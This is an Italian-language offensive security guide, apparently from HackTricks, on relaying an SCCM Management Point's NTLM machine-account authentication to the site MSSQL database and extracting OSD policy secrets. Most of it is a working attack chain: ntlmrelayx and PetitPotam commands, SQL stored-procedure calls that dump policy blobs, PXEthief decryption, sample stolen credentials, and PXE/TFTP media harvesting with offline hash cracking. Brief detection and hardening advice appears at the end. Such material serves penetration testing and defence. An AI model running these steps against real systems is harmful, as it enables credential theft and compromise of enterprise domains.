# SCCM Management Point NTLM Relay to SQL – Estrazione segreti delle policy OSD

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
Inducendo un **System Center Configuration Manager (SCCM) Management Point (MP)** ad autenticarsi via SMB/RPC e **relayando** quell'account macchina NTLM al **site database (MSSQL)** si ottengono i privilegi `smsdbrole_MP` / `smsdbrole_MPUserSvc`. Questi ruoli permettono di invocare una serie di stored procedure che espongono i blob di policy di **Operating System Deployment (OSD)** (credenziali Network Access Account, variabili Task-Sequence, ecc.). I blob sono hex-encoded/encrypted ma possono essere decodificati e decriptati con **PXEthief**, restituendo i segreti in chiaro.

Catena ad alto livello:
1. Discover MP & site DB ↦ endpoint HTTP non autenticato `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
2. Start `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
3. Coerce MP using **PetitPotam**, PrinterBug, DFSCoerce, etc.
4. Attraverso il proxy SOCKS connettiti con `mssqlclient.py -windows-auth` come l'account relayed **<DOMAIN>\\<MP-host>$**.
5. Esegui:
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (or `MP_GetPolicyBodyAfterAuthorization`)
6. Strip `0xFFFE` BOM, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.

Segreti come `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password`, ecc. vengono recuperati senza toccare PXE o i client.

---

## 1. Enumerating unauthenticated MP endpoints
L'ISAPI extension del MP **GetAuth.dll** espone diversi parametri che non richiedono autenticazione (a meno che il sito non sia PKI-only):

| Parameter | Purpose |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | Restituisce la chiave pubblica del certificato di firma del site + GUID dei dispositivi *x86* / *x64* **All Unknown Computers**. |
| `MPLIST` | Elenca ogni Management-Point nel sito. |
| `SITESIGNCERT` | Restituisce il certificato di firma del Primary-Site (identifica il site server senza LDAP). |

Prendi i GUID che agiranno come il **clientID** per le query DB successive:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
## 2. Relay l'account macchina MP a MSSQL
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
Quando la coercizione si attiva dovresti vedere qualcosa di simile:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
## 3. Identificare le policy OSD tramite stored procedures
Connettiti attraverso il proxy SOCKS (porta 1080 per impostazione predefinita):
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
Passa al DB **CM_<SiteCode>** (usa il codice sito a 3 cifre, es. `CM_001`).

### 3.1  Trova i GUID di Unknown-Computer (opzionale)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2  Elencare le policy assegnate
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
Ogni riga contiene `PolicyAssignmentID`, `Body` (hex), `PolicyID`, `PolicyVersion`.

Concentrati sulle policy:
* **NAAConfig**  – Network Access Account creds
* **TS_Sequence** – variabili Task Sequence (OSDJoinAccount/Password)
* **CollectionSettings** – Può contenere run-as accounts

### 3.3  Recuperare il body completo
Se hai già `PolicyID` & `PolicyVersion` puoi evitare il requisito del clientID usando:
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> IMPORTANTE: In SSMS aumentare “Maximum Characters Retrieved” (>65535) o il blob verrà troncato.

---

## 4. Decodifica e decrittazione del blob
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
Esempio di segreti recuperati:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. Ruoli SQL rilevanti e stored procedure
Dopo il relay il login viene mappato a:
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

Questi ruoli espongono dozzine di permessi EXEC; quelli principali usati in questo attacco sono:

| Stored Procedure | Scopo |
|------------------|-------|
| `MP_GetMachinePolicyAssignments` | Elenca le policy applicate a un `clientID`. |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Restituiscono il body completo della policy. |
| `MP_GetListOfMPsInSiteOSD` | Restituito dal percorso `MPKEYINFORMATIONMEDIA`. |

Puoi ispezionare l'elenco completo con:
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. Raccolta dei media PXE (SharpPXE)
* **PXE reply over UDP/4011**: inviare una richiesta di boot PXE a un Distribution Point configurato per PXE. La risposta proxyDHCP rivela percorsi di boot come `SMSBoot\\x64\\pxe\\variables.dat` (config crittografata) e `SMSBoot\\x64\\pxe\\boot.bcd`, oltre a un eventuale blob chiave crittografato.
* **Retrieve boot artifacts via TFTP**: usare i percorsi restituiti per scaricare `variables.dat` via TFTP (unauthenticated). Il file è piccolo (pochi KB) e contiene le variabili media crittografate.
* **Decrypt or crack**:
- Se la risposta include la chiave di decrittazione, fornirla a **SharpPXE** per decrittare direttamente `variables.dat`.
- Se non viene fornita alcuna chiave (media PXE protetto da password personalizzata), SharpPXE emette un hash **Hashcat-compatible** `$sccm$aes128$...` per il cracking offline. Dopo aver recuperato la password, decrittare il file.
* **Parse decrypted XML**: le variabili in chiaro contengono metadata di deployment SCCM (**URL del Management Point**, **Codice sito**, GUID dei media e altri identificatori). SharpPXE li analizza e stampa un comando pronto all'uso **SharpSCCM** con i parametri GUID/PFX/site precompilati per abuso successivo.
* **Requirements**: solo raggiungibilità di rete verso il listener PXE (UDP/4011) e TFTP; non sono necessari privilegi di amministratore locale.

---

## 7. Rilevamento & Hardening
1. **Monitor MP logins** – qualsiasi account computer MP che effettua il login da un IP che non è il suo host ≈ probabile relay.
2. Abilitare **Extended Protection for Authentication (EPA)** sul database del sito (`PREVENT-14`).
3. Disabilitare NTLM non utilizzato, imporre SMB signing, limitare RPC (stesse mitigazioni usate contro `PetitPotam`/`PrinterBug`).
4. Rafforzare la comunicazione MP ↔ DB con IPSec / mutual-TLS.
5. **Constrain PXE exposure** – filtrare UDP/4011 e TFTP verso VLAN fidate, richiedere password PXE e generare alert sui download TFTP di `SMSBoot\\*\\pxe\\variables.dat`.

---

## See also
* NTLM relay fundamentals:

{{#ref}}
../ntlm/README.md
{{#endref}}

* MSSQL abuse & post-exploitation:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}



## References
- [I’d Like to Speak to Your Manager: Stealing Secrets with Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
- [SharpPXE](https://github.com/leftp/SharpPXE)
{{#include ../../banners/hacktricks-training.md}}
